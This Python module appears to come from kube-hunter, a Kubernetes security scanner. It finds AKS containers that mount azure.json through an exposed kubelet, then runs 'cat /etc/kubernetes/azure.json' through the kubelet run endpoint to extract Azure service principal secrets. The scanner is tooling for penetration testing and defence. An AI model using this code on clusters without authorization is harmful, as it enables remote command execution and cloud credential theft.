import json
import logging
import requests

from kube_hunter.conf import get_config
from kube_hunter.core.pubsub.subscription import subscribe
from kube_hunter.core.types import Vulnerability
from kube_hunter.core.types import AKSCluster, ActiveHunter, Hunter, IdentityTheft
from kube_hunter.modules.hunting.kubelet import ExposedRunHandler

logger = logging.getLogger(__name__)


class AzureSpnExposure(Vulnerability):
    """The SPN is exposed, potentially allowing an attacker to gain access to the Azure subscription"""

    container: dict

    def __init__(self, container: dict):
        super().__init__(name="Azure SPN Exposure", component=AKSCluster, vid="KHV004", category=IdentityTheft)
        self.container = container


@subscribe(ExposedRunHandler, predicate=lambda event: event.cloud == "Azure")
class AzureSpnHunter(Hunter):
    """AKS Hunting
    Hunting Azure cluster deployments using specific known configurations
    """

    def __init__(self, event):
        super().__init__(event)
        self.base_url = f"https://{event.host}:{event.port}"

    def get_key_container(self):
        """Get a container that has access to the azure.json file"""
        config = get_config()
        endpoint = f"{self.base_url}/pods"
        logger.debug("Trying to find container with access to azure.json file")
        try:
            pods = requests.get(endpoint, verify=False, timeout=config.network_timeout).json()["items"]
        except requests.Timeout:
            logger.debug("Failed getting pod info from kubelet: timed out")
        except Exception:
            logger.debug("Failed getting pod info from kubelet", exc_info=True)
        else:
            for pod in pods:
                for container in pod["spec"]["containers"]:
                    for mount in container["volumeMounts"]:
                        path = mount["mountPath"]
                        if "/etc/kubernetes/azure.json".startswith(path):
                            return {
                                "name": container["name"],
                                "pod": pod["metadata"]["name"],
                                "namespace": pod["metadata"]["namespace"],
                            }

    def execute(self):
        container = self.get_key_container()
        if container:
            yield AzureSpnExposure(container=container)


@subscribe(AzureSpnExposure)
class ProveAzureSpnExposure(ActiveHunter):
    """Azure SPN Hunter
    Gets the azure subscription file on the host by executing inside a container
    """

    def __init__(self, event):
        super().__init__(event)
        self.base_url = f"https://{event.host}:{event.port}"

    def run(self, command: str, container: dict):
        config = get_config()
        namespace = container["namespace"]
        pod = container["pod"]
        name = container["name"]
        run_url = f"{self.base_url}/run/{namespace}/{pod}/{name}"
        return requests.post(run_url, verify=False, params={"cmd": command}, timeout=config.network_timeout)

    def execute(self):
        try:
            subscription = self.run("cat /etc/kubernetes/azure.json", container=self.event.container).json()
        except requests.Timeout:
            logger.debug("failed to run command in container", exc_info=True)
        except json.decoder.JSONDecodeError:
            logger.warning("failed to parse SPN")
        else:
            if "subscriptionId" in subscription:
                self.event.subscriptionId = subscription["subscriptionId"]
                self.event.aadClientId = subscription["aadClientId"]
                self.event.aadClientSecret = subscription["aadClientSecret"]
                self.event.tenantId = subscription["tenantId"]
                self.event.evidence = f"subscription: {self.event.subscriptionId}"
